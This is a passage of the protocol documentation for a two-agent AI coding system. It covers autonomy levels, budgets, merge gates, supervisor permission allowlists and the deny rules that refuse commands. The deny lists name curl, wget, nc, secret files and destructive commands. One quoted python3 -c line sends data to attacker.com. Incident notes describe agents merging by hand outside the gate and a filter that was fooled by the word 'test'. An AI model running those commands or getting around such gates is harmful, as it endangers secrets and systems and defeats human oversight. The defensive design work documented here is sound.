`bin/pair-duo` takes `--autonomy observe|semi|auto`, with `--auto`, `--semi` and `--observe` as shorthands. The value is checked **before** tmux starts: a bad value is a usage error (`exit 2`), not a fall-through to the next source — a typo ignored after launch would leave the pair working at a level the human did not choose, and the only way to find out would be to notice the effect.

With no flag, `bin/pairctl launch-autonomy` resolves in this order, strongest first:

| source | what it looks like | wins over |
|---|---|---|
| `task` | `autonomy: semi` on the **first line** of the task | the file |
| `file` | `.pair/autonomy`, one word | the default |
| `default` | `auto` | — |

The source travels with the value into the transcript as `via=flag|task|file|default`.
A level nobody can account for becomes a dispute: "why did this round close itself?" has
no answer unless the reason was written down when it was decided.

The task line must **start** the task, not merely appear in it — otherwise the words "move this text about autonomy: semi" would silently demote the pair. A malformed task line or file falls through to the next source instead of failing the launch: refusing to start is worse than starting at a level the human can see in `pairctl status`.

`pairctl ok` means something specific: it counts only when said at `verify` or `done`,
the last word wins, and `bin/pairctl ok --revoke` takes it back. "I approve the plan"
and "the changes are verified" are different statements, and the gate used to treat
them as one. Revocation exists because a human who looks, says ok, and then sees
something else change had no way to unsay it. Stepping a phase back also invalidates
the word: it was given about something the human has since stopped seeing.

§12 is outside all of these axes. Secrets, ports, deploys, migrations, data deletion
and git history stop the pair at any level, including `auto`.

`bin/pairctl reset --yes` leaves autonomy at **`auto`**, the default. An earlier
version left it at `observe`, on the reasoning that wiping state should not raise
authority — but authority is measured against a default, and the human has set that
default to `auto`. Leaving `observe` stopped the pair against "work on your own and
come back with the result", and made the human notice. §12 sits outside this axis, so
`auto` never means "destructive work is allowed".

### 10c. Human-readable messages: one thought, the reason why

A commit is one thought: subject ≤72 chars, imperative
(`fix(pair): heartbeat last_seen on every call`, not "fixed/heartbeat fixes").
The body says WHY, not WHAT — what is visible in the diff. No "why" — do not
commit yet, write it first.

Banned words in messages: `comprehensive`, `robust`, `leverage`, `seamless`,
`cutting-edge`, `delve`, `tapestry`, `«в современном мире»`. The list grows
in place — new entries land here, in §10c, not in a side file that a closed
card deletes.

Notes: one entry is one fact, decision, or verdict. A sheet over 30 lines is
cut into separate plan/finding/decision entries. Duplicates of one thought
in different words are deleted, the exact one stays.

Code comments say only why it is this way and not otherwise, with a pointer
to the measurement or the card. Restating the code in words is banned.

The critic reviews messages as code: slop in a commit is a reasoned
objection, same as for code.

### 10d. Budget ceiling: round limits on machine metrics

`bin/pairctl budget [--reset] [--json]` — machine-visible limits for the active round to prevent infinite looping and runaway autonomy.

Metrics are strictly machine-verifiable (no self-reported token claims):
- `messages`: total `send` and `deliver` events in `transcript.jsonl` since the current round opened.
- `advances`: count of phase `advance` events within the active round.
- `hours`: wall-clock time elapsed since round opening.
- `restarts`: supervisor restart counts for participant roles recorded in `.pair/.restarts-*`.

Defaults configured or overridden via `.pair/budget.json`:
```json
{
  "max_messages": 200,
  "max_advances": 10,
  "max_hours": 24.0,
  "max_restarts": 10
}
```

Invariants (§10d, §12):
1. **`done` is never blocked**: Closing a round into `done` is always permitted, preventing deadlocks when limits are reached.
2. **Backward steps are never blocked**: Reverting a phase (`implement → plan`, `verify → implement`) is always permitted.
3. **Communication is never blocked**: `pair_send` remains open even if budget ceiling is exceeded.
4. **Forward progression blocked on breach**: Only forward phase changes (`plan → implement`, `implement → verify`) are refused by `ProtocolError`.
5. **Reset & fresh round**: Resetting is performed via `bin/pairctl budget --reset` (writes `.pair/budget-reset.json`) or automatically upon reopening a fresh round.

### 10e. Intent gate and Task Receipt

1. **Intent Gate (`scoping → plan`)**:
   Moving from `scoping` forward into `plan` requires an intent artifact `.pair/intent.md`.
   The file must start with `round: N` and contain three required sections:
   - `Problem` (or `Проблема`) — the root issue or motivation.
   - `Scope` (or `Границы`) — clear boundary of what is in and out of scope.
   - `Outcome` (or `Ожидаемый результат`) — acceptance criteria and deliverables.
   Stepping backward or reopening after `done` is never blocked.

2. **Task Receipt (`.pair/RECEIPT-<round>.md`)**:
   Upon advancing to `done`, the server automatically creates a machine receipt documenting the round execution:
   - Round number, close timestamp, task summary.
   - Active writer and participating peers.
   - Tasks closed during the round.
   - Recorded evidence items (test results, diffs, commits).
   - Final round budget metrics (message count, phase advances, wall-clock hours, supervisor restarts).

### 10f. Self-healing loop: `pair-heal`

When a background check, monitor, or peer reports negative evidence (`ok=false`) on a finished round (`phase == "done"`):
1. The server automatically triggers a heal-reopen: phase switches from `done → implement` and `round` increments by 1.
2. A remediation task `#<id>: auto-heal: <kind> failed — <value>` is added to the task ledger.
3. Event `heal_reopen` is appended to `transcript.jsonl`.
4. Flapping safeguard: maximum consecutive auto-heal attempts (`MAX_HEAL_ATTEMPTS = 3`). Exceeding the ceiling halts auto-reopening and requires human intervention.

### 10g. Machine PR Merge Gate and Feature Freeze

PR merging is gated by machine rules rather than prompt agreements:

1. **Sanctioned path: `bin/pairctl pr merge [pr_id] [--force] [--reason REASON]`**:
   This is the only protocol-compliant merge path. Direct `gh pr merge` from a shell
   is a protocol violation: it runs outside the server process, so no machine rule
   can refuse it from inside this repo — fifteen merges shipped that way with zero
   `pr_merge` transcript events before anyone noticed (round 91). GitHub Branch
   Protection (required CI + approving review on `master`, a repo setting the human
   owns) is the only layer that physically stops it; this rule is the contract
   layer, and the transcript (`pr_merged` / `pr_merge_forced`) is the audit trail.
2. **Merge requires a fresh critic APPROVED; NEEDS WORK refuses.**
   The gate reads the last verdict note (`verdict` or `verdict-*` slug, text from
   its own `notes/<slug>.md`) — and the NEWEST MARKED `## `-section decides
   (`review_gate.py`, newest block carrying `verdict-approve <sha|round N>`,
   `**APPROVED**` or a reject marker; unmarked tail sections never hide it).
   Put the marker in the LAST section of your verdict note. `**APPROVED**`
   passes, `**NEEDS WORK**` refuses, bare prose never counts either way.
   A bare `**APPROVED**` pins HEAD through the verdict
   record (`rev.head` must equal HEAD and be fresh). Round 91 is the case: code
   reached `master` five minutes after a refusal.
   A verdict note may carry an explicit `head` (`pair_note` `head` arg): the record
   anchors that revision instead of the live tree (round 97 — re-pin after a branch
   rebuild). The anchor is only an anchor: staleness still reads content, so pinning
   an unreviewed tree stays stale; an unresolvable head refuses loudly.
3. **Preconditions for merging (`check_pr_merge`)**:
   - **Phase constraint**: Phase must be strictly `verify` (merging during `implement`, `plan`, or `scoping` is refused).
   - **Environment**: Must be a valid git repository (fail-closed on merge path: "cannot verify: not a git repo").
   - **Test evidence**: Current round must have passing test evidence (`kind="test"`, `ok=True`), and that
     evidence must name the commit it was measured on — the recorded `head` must equal the head being
     merged. A record bound to the round alone kept vouching for every later commit of that round: the
     round number does not move when the head does (round 138).
   - **The commit being merged**: the gate asks GitHub for the PR's head (`gh pr view --json headRefOid`)
     and refuses when it is not the local HEAD. The merge ships the PR's head, so a gate that looked at
     another commit would vouch for code nobody checked here (round 138). No answer from GitHub, no merge.
   - **Peer review approval**: A non-stale `approve` verdict must exist (`verdict` or `verdict-*` slug).
   - **No self-approval**: The verdict author must NOT be the current writer (`verdict.role != store.writer`).
   - **Staleness check**: Reuses canonical `review.is_stale(...)`. Any code modifications or commits touching reviewed files invalidate the verdict.
4. **Feature Freeze**:
   Enforced naturally by the staleness rule: once an approval verdict is issued, any subsequent commits or file modifications change HEAD or dirty status, causing `is_stale` to return True. This blocks both `pairctl pr merge` and `pair_advance("done")`.
5. **Bypass audit (`--force`) — the sanctioned escape.**
   A dead or absent critic blocks every merge, and critics die. When the merge cannot
   wait for a verdict, `--force` requires a non-empty `--reason` AND the human's
   `pairctl ok` for the round, and is recorded in `transcript.jsonl` as
   `pr_merge_forced`. Loud instead of convenient: a forced merge is visible in the
   audit trail by construction, never a flag somebody discovers quietly.
6. **The repair for a merge that already happened outside the gate:**
   `pairctl pr merge-record <pr_id> [--head SHA] [--base BRANCH]`. It reads the
   remote's real state, refuses an unmerged PR, refuses a `--head` that disagrees
   with the `mergeCommit` GitHub reports, and refuses to guess when `gh` itself
   fails. On a real merge it appends `pr_merge_repaired` naming the merge commit.
   A repair that cannot name what the remote merged is not a repair. Round 115
   needed it: a hand-run `gh pr merge` closed PR #61 and the transcript, at 456
   rows, carried zero merge events — the merge existed, the repo's audit did not.
7. **The next round's branch is cut from a fresh trunk (`origin/master` by
   default; the project's trunk otherwise).**
   A squash merge drops the round's branch from the trunk's history, so the next
   commit on that branch lands in an add/add conflict — and a conflicting PR
   cannot be built into a merge ref, so GitHub reports no checks at all. A PR
   with no checks reads as a green PR. Round 130 lost a branch to exactly this:
   PR #76 was unmergeable, had zero checks, and was closed. The next branch
   comes from the merged trunk, never from the previous round's branch.
8. **The merge trail is audited mechanically.**
   `scripts/merge-audit-trail.py` compares the PRs merged on the remote with the
   journal's merge records — `pr_merged`, `pr_merge_repaired`, `pr_merge_forced`,
   read from the active transcript AND its rotated archives — and fails on a
   merge the journal knows nothing about. The historical debt is named in
   `scripts/merge-audit-baseline.tsv` (59 PRs, in two strata: 1–26 predate the
   gate, 27–60 predate the journal's recording), and it is never healed by
   writing an event into the past — that would forge the journal. The check
   fails closed: without `gh`, without an answer, or without a journal it fails
   rather than reporting success. It is a local audit, not a CI layer: the
   journal is the pair's state, not the repository's. Round 139 added it after
   83 PRs had been merged and 24 of them had a record.

### 10h. Server Runtime Freshness & Supervisor Parking

1. **Server Runtime Freshness Gate (`server_freshness`)**:
   MCP servers are long-lived processes. When server source files (`mcp/pair_mailbox/*.py`) are edited, in-memory servers continue executing stale bytecode.
   - `pair_state` exposes runtime status: `server_fresh: bool` and `server_stale_files: list[str]`.
   - `pair_advance` fail-closed gate: Forward phase transitions and round reopenings (`done` → `implement`) are refused with `ProtocolError` if `server_fresh` is false, requiring server restart (`serve.sh`). Backward recovery steps (`PHASE_BACKWARD`) remain open.
   - `pairpilot` detects stale server processes and records `pilot_server_stale` events in the transcript.
   - **The comparison is by content, not by mtime.** The gate hashes the runtime sources (the
     files a server loads, test files excluded) when the process starts, and compares that hash
     with the files on disk. A merge or a checkout rewrites the mtimes of files whose bytes did
     not change: round 137's close was blocked twice by that, each time right after a merge that
     brought the round's own code. The mtime is still reported, and still drives the
     cross-process callers (the doctor, `pairrestart`) that cannot read another process's
     snapshot — but the gate's own question is whether the bytes differ.
   - **Restarting the server from inside a session.** The protocol's remedy is `serve.sh`, and
     the harness owns the MCP server. When the agent cannot restart the harness, killing the
     MCP server process is the same remedy: the client spawns a fresh one, which loads the
     current code. Round 138 measured it twice, both times on the round's own close.
2. **Supervisor Done Parking & Token Budget Protection**:
   In continuous supervisor mode, once a round reaches `phase: done`, `pairpilot` parks itself (`pilot_parked`) if no open tasks (`pair_task`) and no pending obligations exist:
   - Suppresses silence escalations, repetitive nudges, and note wake file escalations (`poll_wakes`) to prevent token quota waste on idle rounds.
   - Preserves active unblocking and wakes whenever a peer delivers a new message, opens a task, or changes the phase.
3. **Smart Auto-Compact**:
   Prevents context exhaustion stalls. `/compact` is injected only into roles
   whose CLI declares `"supports_compact": true` in `cli-profiles.json` (today:
   pi, omp, opencode); other CLIs get Escape-only recovery and no preventive
   compact, so no garbage lands in their input line:

## 11. Audit

`transcript.jsonl`, append-only, per event: a message, a capture, a phase
change, a patch reservation, sealing, hash verification, **and every refusal**.

Refusals are the most valuable part. A peer trying to cross the write boundary is
exactly the event worth keeping.

```sh
bin/pairctl log --limit 50
```

If a run cannot be reconstructed from this file, it did not happen, regardless of
the final report.

## 12. Stop trigger

Six things stop the pair and ask the user, and only six:

`.env`, secrets and tokens, deploy targets and ports, deploys, database
migrations, deletion of data or git history.

Everything else, including uncertainty, is resolved between the agents.
Uncertainty is not a reason to wake the human: pick an option, record a `decision`
with the reason, carry on.

## 13. The supervisor: who watches the pair while both are silent

Agents are passive by design: having finished a step, they wait for input. While
neither writes to the other the pair is idle, and only the human can wake it.
`bin/pairpilot` is a process that watches the pair from outside and does exactly
seven things: deferred delivery, nudging a silent role, confirming a permission
request **from the allowlist**, restarting a failed agent, signalling a stalled
patch, a checkpoint digest, and the report on round close.
You never start it by hand: `pairup` (daily, from the project folder),
`pair-duo --pilot` and `finish.sh` (step 5) raise it when dead and leave a live
one alone.

And it deliberately cannot: move a phase, grant or take write authority, commit,
apply another's patches, or touch project files. Otherwise §2 stops being a boundary.

`bin/pairctl roster` shows who is registered; `--prune` removes what is demonstrably
gone — the process is dead **and** the pane is either absent or belongs to another
live role. One fact is not enough: after a crash a live pane may be a shell the human
opened. Pruning refuses to remove whoever holds write authority, and every removal
lands in the transcript. `finish.sh` prunes before launching, so fresh agents do not
register on top of a previous session's pane records.

### 13a. Restarting a failed agent

Only when: the process is genuinely dead (pid does not answer), the pane is alive,
no live role shares it, autonomy is not `observe`, the launch command is known, and
the throttle allows it.

The command is taken "explicit before guessed": `--launch role=cmd`,
`PAIR_LAUNCH_<ROLE>`, `.pair/restart.json`, the `launch` field in
`cli-profiles.json`. No command means no restart, and `pilot_restart_impossible` lands
in the transcript with the reason. A guessed command is worse than a missing one: the
pane comes alive and immediately dies again.

**`respawn-pane` is run without `-k`.** tmux refuses to respawn a live pane, and that
is exactly right: after an agent crash, what occupies the pane is usually a shell or
a debugger the human opened. The restart fires only where the pane is genuinely dead,
and a busy one is left to the human with the refusal recorded.

A role comes back under the same name, because `install.sh` bakes the role into the
MCP config rather than into process memory. **A restart does not touch write
authority**: the writer remains whoever the human appointed. That is what makes a
restart safe — it repairs a process, not the trust boundary.

Restarting brings back a process, not a memory. The returned role has neither the
task nor the round's context, and nobody knows a generic way to resume an `agy` or a
`claude` session — so the pilot leaves a note in `.pair/notes/pilot-restart-<role>.md`
pointing at `.pair/tasks.md`, which lists what is left. Guessing a flag would require
the profile to know the protocol, and profiles should not.

Silence and death are cured differently and must not be mixed: silence is a nudge,
death is a restart. A live process must not be touched — it will not lose its
context while it is working.

A pane that does not exist is not brought up: a window the human closed is a
decision, not a stall.

A role whose process is dead does not make a pane shared. Verified live: `claude` and
`codex` had died and their roster entries outlived them, so `skip` contained all
three roles including a live one, and the supervisor stopped serving the project
because two dead neighbours appeared to share a pane with a living agent. A stale
role is announced once, because silence about it is what made this invisible; clearing
the roster stays the human's call.

### 13b. The permission allowlist

`resolve_permission_prompt` confirms only what matched the allowlist. The default
list is not "reading only": it is the work the protocol already requires without a
human, or the pair stalls at every step.

Allowed by default:

- reading: `Read`, `grep`, `glob`, `ls`, `cat`, `head`, `tail`, `find`;
- editing inside the project: `write`, `edit`, `create`, `replace`, `patch`, `apply`,
  `format`, `lint`;
- checks and builds: `ruff`, `mypy`, `tsc`, `make`, `npm run`,
  `build`; test runners (`pytest`, `unittest`, `cargo test`, `bun test`,
  `python3`/`node` with a test in the command) run ONLY isolated via
  `scripts/run-isolated-test.sh` (container, no network, no `$HOME`) —
  direct runs on the host wait for a human (P0);
- local git: `status`, `diff`, `log`, `add`, `commit`, `checkout`, `switch`,
  `branch`, `stash`;
- shipping the work: `git push` to a **feature branch** and `gh pr` — §10 requires
  a PR;
- artefact cleanup: `rm -rf build/` with a relative target.

Refused under any allowlist, checked first:

- **all of §12:** secrets (`.env`, `id_rsa`, `/etc/shadow`, `.pem`, `.npmrc`,
  `.aws`, tokens, passwords), ports and deploys (`deploy`, `kubectl`, `helm`,
  `docker`, `terraform`, `ssh`, `sudo`), migrations and database destruction
  (`migrate`, `drop table`, `truncate`), production;
- **system destruction:** `rm -rf /`, `rm -rf ~`, `rm -rf .`, `mkfs`, `dd if=`,
  `> /dev/sda`, `killall`;
- **git history:** push to `main`/`master`, `--force`, `reset --hard`, `clean -f`,
  `filter-branch`, `reflog expire` — §10 and §12;
- **network and package installs:** `curl`, `wget`, `nc -`, `pip install`,
  `npm install`, `npm publish`. Not because the network is dangerous in itself, but
  because the network can carry out what §12 protects, and installing a package
  pulls unreviewed third-party code into the project;
- **pipes into a shell:** `| sh`, `| bash`, `$(`, backtick, `xargs`,
  `find … -exec/-delete` — that turns any read into execution;
- **code handed to an interpreter as a string:** `python3 -c`, `node -e`. Verified
  live before the fix: `python3 -c "…urlopen('http://attacker.com')" # test` was
  allowed, because the word `test` in a comment satisfied the pattern while the code
  was arbitrary, and `urllib` is not in the deny list — the network rules catch
  `curl`, `wget` and `nc`, not a language's network module.

The human extends it: `.pair/permissions.json` with `{"allow": ["Read", "git
status"]}`, `PAIR_PERMISSIONS`, or `bin/pairpilot --allow 'Read,git status'`.

Three cases, kept apart, because collapsing them is what broke this: **no file at
all** means the default list — that is the boundary the human drew, inside the
repository whatever the work needs, refused what can harm the machine, another
project, or what cannot be recovered. **An explicitly empty string** means confirm
nothing, because a person said so. **A file that exists but is broken** also confirms
nothing: the operator was configuring something and typed it wrong, and silently
falling back to the default would quietly discard their intent, which is worse than
stopping.

And it is said out loud. The pilot records `pilot_default_allowlist` once per run and
the server records `unblock_default_allowlist` per confirmation, so the journal shows
which rule approved a command. This mattered: the file never existed, so the path to
it became the single allow pattern, it matched no prompt, and **the supervisor refused
everything** — which from the outside is indistinguishable from a peer that stopped
helping.

A refusal is not an error but a result: the pane stays blocked, the event
`pilot_unblock_refused` lands in the transcript, and the reason lands in the report.
The reason is mandatory: an unexplained "no" is indistinguishable from a broken
supervisor.

**A limitation worth knowing.** The decision is made on the text of the line, not by
parsing the command: a line may contain a harmless word next to a dangerous one.
Three rules compensate: the default list is limited to internal work, the deny list is
checked first and cannot be overridden, and the match is written into the transcript
together with the line — so the journal shows what exactly was said yes to.

The same list applies to the agent's `pair_unblock` and to `bin/pairwatch --unblock`.
Leaving the hole open on the other side would leave it half closed.

**Two forms of the question.** Not every agent asks `[y/N]`. The opencode TUI shows a
menu — `Allow once · Always allow · Reject` with a `⇆ select  enter confirm` footer.
The differences matter, and both are handled:

| | `[y/N]` | menu |
|---|---|---|
| how it is detected | `PERMISSION_PATTERNS`, last two lines | the `Permission required` header **and** menu markers |
| what the verdict is taken from | the question line | the whole modal — the command is in the body (`$ git status`), not the header |
| what is pressed | `y`, then `Enter` | `Enter` only |
| composer check | yes | no: a modal has no input line |

`y` does not mean consent in that TUI, so it is not sent. A verdict on the header
alone would refuse everything — it contains no word from the allowlist — so approval
in a menu would silently stop working. `Permission required` in ordinary output is not
a question: both markers are required.

For `[y/N]`, the verdict also reads a few lines above the question
(`OVERSCAN_LINES`), because Claude Code prints the command on the second-to-last line
and the question last — taking the question alone refused 100% of safe commands, so
`auto` was inoperative on that CLI. The cap exists so approval cannot be granted by a
word from far up the screen.

### 13c. Your own deny list outranks the supervisor

Every CLI has its own mechanism and it fires **before** any of ours. For OpenCode
that is `permission` in `opencode.jsonc` and the `--auto` flag: in auto mode,
requests that are not explicitly denied are confirmed by themselves, while `"deny"`
rules always apply.

```jsonc
{
  "permission": {
    "bash": {
      "*": "allow",
      "sudo *": "deny", "curl *": "deny", "wget *": "deny",
      "pip install *": "deny", "npm install *": "deny", "npm publish *": "deny",
      "ssh *": "deny", "docker *": "deny", "kubectl *": "deny",
      "terraform *": "deny", "helm *": "deny", "mkfs*": "deny", "killall *": "deny",
      "git push *main*": "deny", "git push *master*": "deny", "git push --force*": "deny",
      "git reset --hard *": "deny", "git clean -f*": "deny", "git filter-branch*": "deny"
    },
    "read": {
      "*": "allow",
      "*.env": "deny", "*.env.*": "deny", "*.env.example": "allow",
      "**/.ssh/*": "deny", "**/id_rsa*": "deny", "**/*.pem": "deny", "**/*.key": "deny",
      "**/.npmrc": "deny", "**/.aws/*": "deny", "**/.git-credentials": "deny"
    }
  }
}
```

The asterisks there are opencode's own syntax, not ours: rules apply in order and the
last match wins, which is why `"*": "allow"` goes first.

Why this is better than the supervisor's allowlist rather than next to it:

- **it fires earlier.** The CLI shows no dialog at all, so the agent does not stall
  and the supervisor is not left deciding whether to press Enter;
- **it is mandatory.** `"deny"` applies in auto mode too, so a typo in our allowlist
  cannot get past it;
- **the human reads it.** The rules live in their config, next to the model settings,
  not inside the tool we happen to ship.

That is why `launch` for OpenCode includes `--auto`: the agent stops stopping at every
step, while the boundary rests on `deny`, which the human sees and can change.

## 17. Git Worktrees Isolation (S5)

When multiple pairs run in parallel, or when switching between tasks without dirtying
the main working tree, git worktrees provide filesystem isolation.

- `pairup --worktree <branch>` (alias `-w <branch>`):
  Automatically provisions `.worktrees/<branch>` via `git worktree add`, switches into it,
  and scopes `.pair` state locally.
- `pairctl worktree list [--json]`:
  Lists registered worktrees across the repository.
- `pairctl worktree prune [--json]`:
  Cleans stale worktree administrative records (`git worktree prune`).
- `pairctl worktree remove [--target <path/branch>] [--force]`:
  Removes an allocated worktree.
## 18. Diagnose against the tree, not against your own harness

A diagnosis that cannot be wrong is not a measurement. Round 115 put a price on
ignoring that: omp spent two hours chasing a defect that did not exist, and
wrote a backlog card asking the next agent to hunt the same phantom.

What happened. Diagnosing an ack refusal, omp built `Store(Path('.'))` where the
intended root was `Path('.pair')`. `state_path` became `./state.json`, which
does not exist, so `_load` returned `default_state()` — an empty `seen`, an
empty `pending_reads`. A `.get()` chain returned `None` where a value was
expected, and that `None` got read as a finding. Two direct runs then
contradicted the card on screen — both green — and both were read as "the file
changed under me" rather than "I passed the wrong path".

Rules that follow, each paid for once:

1. **A wrong root is a caller error, not an empty pair.** `Store.__init__`
   refuses a state dir with no `state.json`, naming the path it tried and the
   `.pair` neighbour that was almost certainly meant (`store_core.py`). The
   seed of the mistake is nearly always a missing suffix, so say it.
2. **`dict.get()` returning `None` where a value was expected ends the
   experiment, not starts one.** Make it raise. A `None` you did not predict has
   already destroyed what the run meant.
3. **When two paths give different answers, diff their inputs before
   theorising** — path, object, class. Not caching, not races: paths first.
4. **A green run that contradicts a hypothesis is evidence about the
   hypothesis.** Two green results with the "wrong" answer mean the harness is
   wrong, not the tree. Re-read the harness before filing anything.
5. **Suite scope is part of the claim.** `pytest mcp/pair_mailbox/` is not the
   project. Round 115 was green locally and red in CI because the CI runs
   `scripts/verify-project.sh`, which covers install, pilot and supervisor
   suites the narrower path never touches. Run what ships.

A card filed from this class is worse than no card: it spends the next agent's
time on the phantom it manufactured.

## 19. One trunk, short round branches, and a round card a stranger can read

Decided by both agents 2026-10-18 (omp proposed, agy verdicted), after the human
asked two questions the repo could not answer: *which branch do rounds target*,
and *why do merged round branches stay on the remote*. Both were asked because a
fresh clone kept receiving a repo nobody had curate.

### The branch model: trunk-based

1. **`master` is the only long-lived branch.** There is no `develop`, no `dev`,
   no release branch. A branch that outlives its round is a branch that will rot
   silently: `origin/dev` was created in round 113, never mentioned in a single
   document under `docs/`, and by round 115 its five touched files were
   byte-identical to `master`'s — a dead duplicate, not a queue of work.
2. **A round branch lives as long as the round.** It exists from the first commit
   of a round to its merge, and no longer. Naming stays `round-<N>-<slug>`.
3. **Merging deletes the branch — through the sanctioned path.** §10g already
   names `bin/pairctl pr merge` as the only protocol-compliant merge; it merges
   with `--delete-branch`, so a merged `round-*` branch disappears by construction
   rather than by somebody remembering. A hand-run `gh pr merge` that leaves the
   branch behind has taken on a cleanup obligation it cannot see.
4. **The audit trail is git, not the branch list.** Round history lives in the
   commit messages and the PRs; the remote branch list carries no information
   that the log does not. Two merged branches left on `origin` are two lies about
   where the work is.

### The trunk is a project setting, not a constant in the engine

Round 144 measured what a hardcoded `master` costs when the human orders
otherwise: the round was merged into `dev` exactly as ordered, and then
`pair_advance("done")` was refused with "1 commits ahead of origin/master". The
engine had no notion of a trunk other than `master` — the close-side gates
(`review.origin_truth`, `review.hotfix_trailer_check`, `server._pin_round_base`,
`manifest._round_merged`) compared against `origin/master` by name. A project
whose trunk is another branch could merge, deliver and review a round, and
never close it.

The trunk is now resolved, in this order, first hit wins:

1. **`PAIR_TRUNK`** — the environment, for one process (a pilot run, a CI job).
2. **`<project>/.pair/trunk`** — the LOCAL setting of one workspace. It lives in
   the ignored state dir, so a local choice never dirties the tree and never
   travels.
3. **`<project>/.pair-trunk`** — the COMMITTED policy of the project, for
   everybody who clones it.
4. **`master`** — the default. A project that says nothing keeps the behaviour it
   had, byte for byte.

Every close-side gate asks the resolver (`mcp/pair_mailbox/trunk.py`) instead of
naming a branch: the origin-truth comparison, the hotfix-trailer check, the
pinned round base, the manifest's merge detection, the §20 class table (the
project's trunk is the trunk class, whatever its name), and the branch janitor.

The local pre-push guard (`bin/git-hooks/pre-push`) refuses a direct push to a
PROTECTED branch, and there are two of them: the project's trunk, and `master`
always. Naming another trunk does not hand `master` over to direct pushes — a
project that moved its trunk still keeps `master` closed, and a guard that
guarded `dev` while `master` went open was the defect round 144's second slice
carried into its own merge.

Two rules keep this safe:

- **The default changes nothing.** No existing project moves until it says which
  branch it wants.
- **The resolver reads a NAME, never a remote and never the network.** It is
  asked on hot paths (every `pair_state`, every close), and a gate that can
  hang on a network call is a gate that hangs.

### The round card: memory survives the clone

1. **Each closed round leaves one tracked file: `docs/rounds/<N>.md`.** Not twenty:
   one. It records what was wrong, what was done with measured numbers, what broke
   and what it cost, and the follow-ups that stayed open.
2. **This exists because `.pair/` is git-ignored, and must stay so.** It carries
   runtime state — mailbox, patches, budget, six dozen receipts — all of it
   disposable and none of it a stranger's business. But that means the *reasoning*
   of a round is invisible in a clone. The round card is the slice of that
   reasoning worth keeping, moved to a tracked path by hand, at close.
3. **The receipt points to the card, not away from it.** §10e's automatic
   `RECEIPT-<round>.md` stays machine-generated in `.pair/`; the round card is its
   public face. Link both ways.
4. **A round that closes without a card is not finished.** This is the
   close-checklist item §10e owes and never had.

## 20. Branch classes, and a janitor that may only delete what is proven merged

Decided by both agents 2026-10-18 (omp proposed, agy corrected and verdicted),
after the human asked the question §19 could not answer: *this branch model was
written for two agents sharing one repo — how does it scale to a repo where
reviewers, team leads and ordinary developers work too?* §19 names one trunk and
one mortal round branch. A human repo needs verdicts about branches whose names
are not `round-*` and which outlive one PR on purpose.

§19 stays. §20 refines it: it says what makes a branch class readable by a
machine, and what a cleanup job is allowed to do on the strength of that class
alone.

### Why the class must come from the name

1. **On GitHub the only machine-readable class discriminator is an fnmatch name
   pattern.** Branch protection and rulesets match names (`master`, `release-*`,
   `users/*`). Labels and PR state are additional, not simpler: reading them
   turns every check into a network call, which is exactly what our hot paths
   forbid (`mcp/pair_mailbox/review.py` reaches for local refs only, and says so).
2. **`Automatically delete head branches` is a repository setting, and it is
   blind to names.** It deletes any head branch after its PR merges — including a
   strategic one, unless that branch is protected with `do not allow
   deletions`. So the setting is safe only when the strategic class is protected
   by name, which returns the reasoning to rule 1.
3. **Therefore: a branch whose class cannot be read from its name is a branch no
   rule can protect.** That is not a naming preference; it is the price of any
   automated cleanup at all. An unnamed class is a janitor that guesses.
4. **`dev`, `develop`, `integration`, `staging` — accumulators — are an
   antipattern here, named as one.** A branch whose job is to collect other
   branches is a branch that will rot silently: `origin/dev` sat from round 113
   with five files byte-identical to `master` and not one mention under `docs/`.
   There is no "but it is our integration branch" exemption; §19 rule 1 already
   deleted it once.

### The classes

| class | name | lifetime | robot may delete? | protection |
|---|---|---|---|---|
| trunk | the project's trunk (`master` by default — see "The trunk is a project setting" above) | forever | **never** | protected; no direct push (local hook, `bin/git-hooks/pre-push`) |
| strategic | `release/*`, `support/*` | longer than one PR | **never** | `do not allow deletions`; delete only by hand, with a reason, recorded |
| ephemeral | `round-*`, `feature/*`, `fix/*`, `hotfix/*`, `chore/*` | one PR, dies with the merge | **only when its PR is MERGED** | none needed |
| personal | `users/<name>/*` | the author's, no trunk merge | **never** — TTL sweep reports, humans decide | none |
| anomaly | anything else | — | **never** | reported |

Two corrections to first instinct, both from the critic:

- **`hotfix/*` is ephemeral, not strategic.** A hotfix fixes one incident and
  closes through a PR; `review.py`'s `hotfix_trailer_check` already demands
  `follows: PR #N` on every commit after the round base on the trunk,
  which is the lifecycle of a mortal branch written down in code. Strategic
  means a *support line*: a release that keeps receiving cherry-picks for
  months.
- **Personal branches never merge to trunk, so they are never a cleanup target.**
  A sweep may report them as stale by age; it may not delete them, because
  "stale" is a statement about somebody's unfinished thought.

### The janitor contract (fail-closed, in every branch)

1. **A janitor may delete only what it has proven merged.** The proof is `gh pr
   view` state == MERGED (or reachability from the trunk ref), never the name,
   never the branch's age, never "the PR looks closed". The shape is
   `pairctl pr merge-record`'s: read the remote, refuse a mismatch, refuse when
   `gh` fails — `mcp/pair_mailbox/review_gate.py`.
2. **trunk and strategic are never deleted by a robot.** No exception, no
   `--force`, no "just this once".
3. **An ephemeral branch that is not proven merged is reported, not deleted.**
   CLOSED-unmerged and abandoned branches come back as STALE in a human report.
   Deleting a closed-but-unmerged branch destroys the only copy of work the
   repo never accepted.
4. **An unrecognised name is an ANOMALY, never a deletion candidate.** An
   anomaly means the naming contract was broken upstream; a janitor that
   "helpfully" tidies anomalies teaches everyone to name badly.
5. **Every deletion the janitor performs is recorded with what it knew: branch
   name, head SHA, PR id, and the proof it relied on.** No silent sweeps. The
   transcript row is the reason the deletion is defensible a month later.

### Checklist for a repo that adopts this

- [ ] `master` protected: required review, required checks, `do not allow
      force pushes`, `do not allow deletions`, and the restrictions applied to
      admins too (`Do not allow bypassing the above settings`), because a
      protection admins skip is a protection for everybody else.
- [ ] `release/*` and `support/*` protected with `do not allow deletions`.
- [ ] `Automatically delete head branches` enabled — safe now, because the
      classes that must survive are protected by name rather than by the setting.
- [ ] Personal branches live under `users/`, so no sweep can mistake them for a
      deliverable.
- [ ] `bin/pairctl branch audit` (the janitor) runs on a schedule and reports
      STALE and ANOMALY; it deletes only proven-merged ephemeral branches, and
      writes a row per deletion.

§19 said a merged round branch dies by construction. §20 says the same for every
mortal class, and says what may never die: the trunk, the support lines, and a
branch nobody has proven merged.

## 21. Worktree-first: the isolation strategy is declared and agreed

Decided by both agents 2026-10-26 (round 147, P1 in the backlog), after the human
asked for the worktree-first discipline for parallel agent work.

The problem this solves is not "worktrees are nice". It is that a writer's
isolation decision, taken alone, goes wrong in both directions: too much
machinery for a typo fix (a worktree per sentence), or one thousand-line system
